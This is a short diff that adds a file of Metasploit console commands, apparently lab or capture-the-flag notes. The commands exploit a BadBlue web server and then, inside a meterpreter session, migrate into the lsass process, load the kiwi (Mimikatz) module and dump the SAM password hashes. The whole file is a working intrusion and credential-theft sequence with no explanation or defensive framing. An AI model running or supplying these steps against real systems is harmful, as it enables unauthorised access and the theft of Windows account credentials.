@@ -1,0 +1,12 @@
+search badblue
+
+set RHOSTS
+
+exploit
+
+meterpreter> pgrep lsass
+  780
+meterpreter> migrate 780
+meterpreter> getuid
+meterpreter> load kiwi
+meterpreter> lsa_dump_sam
